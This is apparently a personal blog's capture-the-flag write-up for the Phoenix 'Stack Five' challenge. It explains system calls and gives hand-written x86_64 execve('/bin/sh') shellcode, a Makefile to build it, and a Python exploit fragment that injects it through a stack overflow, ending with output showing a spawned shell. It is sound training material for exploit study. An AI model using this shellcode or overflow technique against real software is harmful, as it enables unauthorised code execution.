---
title: "Phoenix Challenges - Stack Five With Custom Shellcode"
date: 2023-05-19T20:00:00-00:00
categories:
  - CTF
  - Phoenix
tags:
  - Phoenix
  - CTF
---

<div style="text-align:center">
  <img src="/assets/images/post_images/Phoenix/phoenix.png">
</div>

This blog post is a bit different. Instead of a new challenge, it is an extension of the previous [*Phoenix Stack Five* writeup](https://secnate.github.io/ctf/phoenix/phoenix-stack-five-pwntools-shellcode/). Those unfamiliar would need to review it before continuing.
{: style="text-align: justify;"}

In the previous challenge, we used Pwntools’ *shellcraft* module to generate the shell-opening shellcode with one line of Python. While this may satisfy script kiddies, *real* hackers need to understand, build, and use exploits on a technically deeper level.
{: style="text-align: justify;"}

Hence, we will craft our own shell-popping shellcode. Let’s get started.
{: style="text-align: justify;"}

# Related Concept
Computers execute programs in two modes:
{: style="text-align: justify;"}

- **User Mode:** This is the mode that regular end-user applications are executed in. Such programs include text editors, Skype, and yes, the *Stack Five* challenge’s executable. Programs have limited ability to interact with other processes executing simultaneously. For example, a running Skype program cannot interact with a simultaneously-running Chrome Browser process, query it for data, or affect its settings in any way. They also have little (if-any) ability to query and/or control computers’ operating system resources, settings, and hardware.
{: style="text-align: justify;"}

- **Kernel Mode:** This mode controls computers’ operating system resources, settings, and hardware. This includes interacting with all I/O devices [Fax, Printer, CD drive, SD Card, etc].
{: style="text-align: justify;"}

These two modes exist for security, functionality, and developer efficiency purposes. We do not want simultaneously running Chrome and Skype programs to deliberately or accidentally interact with each other, nor for a running program to accidentally overwrite critical operating system files with inputted user data. 
{: style="text-align: justify;"}

Excellent. However, such a separation of duties introduces a challenge. How will user-mode programs be able to read and write data to and from memory, access the computer’s file system, and read data to/from peripherals like a networking socket or a printer? Such capabilities are all in kernel mode – which user mode applications categorically *can not access.*
{: style="text-align: justify;"}

The solution? System calls. These are an interface for user-mode applications to request the execution of operating system capabilities. User-mode applications make a request and the operating system service them and return any generated outputs.
{: style="text-align: justify;"}

<div style="text-align:center">
  <img src="/assets/images/post_images/Phoenix/stack-five-custom-shellcode/system_call.png">
</div>
**Source:** [System Calls in OS (Operating System)](https://www.scaler.com/topics/operating-system/system-calls-in-operating-system/)
{: style="text-align: center;"}

# The Shellcode
Each computer architecture has specific conventions for preparing a system call command. [The system call table for x86_64](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/) indicates how the registers are to be initialized before launching **sys_execve:**
{: style="text-align: justify;"}

<div style="text-align:center">
  <img src="/assets/images/post_images/Phoenix/stack-five-custom-shellcode/register_args.png">
</div>

The RAX register is the numerical identifier of the system call function to be invoked and the RDI, RSI, and RDX registers are pointers to parameter values. It should be noted that if RSI or the RDX are initialized to 0 (i.e. NULL), that means that the parameter is an empty array.
{: style="text-align: justify;"}

We now start preparing the information needed to write our shellcode. Because the goal is to launch an `execve(filename = “/bin/sh”, …)`, we need to determine the `/bin/sh` string’s address. It will be passed as a pointer into the system call’s invocation.
To do this, we load the Stack Five executable and check if `/bin/sh` is located anywhere:
{: style="text-align: justify;"}

```
pwndbg> search "/bin/sh"
libc.so         0x7ffff7df70f0 '/bin/sh\n/bin/csh\n'
libc.so         0x7ffff7dfa064 0x68732f6e69622f /* '/bin/sh' */
libc.so         0x7ffff7ffa064 0x68732f6e69622f /* '/bin/sh' */
```

Excellent. The `/bin/sh` string is located at **0x7ffff7dfa064** inside `libc.so`, the linked C standard library. It will *always* be at the same memory address since the *Stack Five* executable has ASLR disabled per the previous [*Phoenix Stack Five* writeup](https://secnate.github.io/ctf/phoenix/phoenix-stack-five-pwntools-shellcode/)
{: style="text-align: justify;"}

There are two other function parameters that need to be specified in the [execve()](https://www.man7.org/linux/man-pages/man2/execve.2.html) system call: **argv** and **envp**. These are an array of command-line arguments passed into the invoked program and an array of environment variables passed into the new program’s execution respectively. Because a successful execution of `/bin/sh` does not require any additional command-line arguments or environment variables, the **argv** and **envp** will be empty arrays.
{: style="text-align: justify;"}

We now have all the necessary information. The x86_64 shellcode is displayed below – with explanatory comments
{: style="text-align: justify;"}

```
nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-five-crafted-shellcode$ cat shellcode.S
#include <sys/syscall.h>
/*
	This is the shellcode's program code section
*/
.global main
.type main, @function
main:   /* This is where the shellcode starts execution */
	
	/* Assign the system call number = 59 for SYS_EXECVE system call */
	movq $59, %rax /* Trying to load the 59 into the %rax register */
	/*
	   The RDI register contains the first argument passed into called
	   functions in the x86_64 architecture. In this case, the first
	   argument passed into the execve function is "/bin/sh".
	  Fortunately, the "/bin/sh" string can be found in the
	  dynamically linked c library "libc.so".
	  Taking advantage of the fact that ASLR is not enabled, we know that
	  the linked "libc.so" library will be lcoated in the same position
	  of the compiled executable each time its run. Therefore, we can just
	  load in the fixed memory address of the "/bin/sh" string for usage
	*/
	xorq %rdi, %rdi		    /* Clear the rdi register for further processing */
	movq $0x7ffff7dfa064,  %rdi /* Initialize the rdi register with the fixed address of the "/bin/sh" string */
	/*
	   The RSI register contains the second argument passed into a function.
	   In this case, it is SYS_EXECVE's argv = 0 to indicate that there
	   are no arguments passed into the /bin/sh shell
	*/
	movq $0, %rsi
	/*
	   The RDX register contains the third argument passed into a function.
	   In this case, it is the SYS_EXECVE's envp = 0 to indicate that there
	   are no environmental variables passed into the launched "/bin/sh" shell
	*/
	movq $0, %rdx
	/*
	   We call execve("/bin/sh", argv=[], envp=[])
	*/
	syscall
```

Excellent. The shellcode is crafted. We now need to ensure it is properly compiled for deployment. To ensure a longer series of steps is done automatically and systematically with a short command-line invocation, we craft a Makefile:
{: style="text-align: justify;"}

```
nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-five-crafted-shellcode$ cat Makefile
all:
	gcc -m64 -c -o shellcode.o shellcode.S
	objcopy -S -O binary -j .text shellcode.o shellcode.bin
	rm -rf shellcode.o
clean:
	rm -rf shellcode.bin
```

The default [**make all**] instruction takes the *shellcode.S* file, compiles it into a *shellcode.bin* file ready to be lobbed in an exploit. The intermediary *shellcode.o* file [ a “byproduct” of this compilation effort] is then deleted to prevent excess clutter.
{: style="text-align: justify;"}

On the other hand, the **make clean** instruction prepares for future compilations by deleting an older *shellcode.bin* file, if such exists.
{: style="text-align: justify;"}

The following console output shows how the Makefile can be used to compile the shellcode and then prepare for future compilations by deleting the old *shellcode.bin* file version
{: style="text-align: justify;"}

```
nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-five-crafted-shellcode$ make
gcc -m64 -c -o shellcode.o shellcode.S
objcopy -S -O binary -j .text shellcode.o shellcode.bin
rm -rf shellcode.o

nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-five-crafted-shellcode$ make clean
rm -rf shellcode.bin
```

# The Exploit
We now take the *exploit.py* file from the previous [*Phoenix Stack Five* writeup](https://secnate.github.io/ctf/phoenix/phoenix-stack-five-pwntools-shellcode/) and insert the following at its beginning:
{: style="text-align: justify;"}
```
import subprocess # library for running Linux system console commands
#
# First need to compile the shellcode into the binary file for import
# We will do this by invoking an external [i.e. non python] system command
subprocess.run("make clean && make", shell=True)
#
file = open("shellcode.bin", "rb")
imported_shellcode = file.read()
file.close()
```

It performs a fresh compilation of the shellcode each time the *exploit.py* script is run and imports the compiled results as a binary. This is done to ensure that any updates to the shellcode are not missed. 
{: style="text-align: justify;"}

We then delete the previous [*Phoenix Stack Five* writeup's](https://secnate.github.io/ctf/phoenix/phoenix-stack-five-pwntools-shellcode/) exploit.py file’s line for generating shellcode with Pwntools. The new shellcode is then fed in with:
{: style="text-align: justify;"}
```
payload = imported_shellcode + payload[len(imported_shellcode):]
```

Executing, we get
{: style="text-align: justify;"}
```
nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-five-crafted-shellcode$ ./exploit.py
rm -rf shellcode.bin
gcc -m64 -c -o shellcode.o shellcode.S
[+] Starting local process '/opt/phoenix/amd64/stack-five': pid 34879
[*] Switching to interactive mode
Welcome to phoenix/stack-five, brought to you by https://exploit.education
$ ls
final-one    format-one    heap-one    net-one       stack-four    stack-two
final-two    format-three  heap-three  net-two       stack-one    stack-zero
final-zero   format-two    heap-two    net-zero    stack-six
format-four  format-zero   heap-zero   stack-five  stack-three
$ whoami
nathan
```

The code can be found in the [Github repository](https://github.com/secnate/Exploit-Education-CTFs) for Phoenix challenge solutions.
{: style="text-align: justify;"}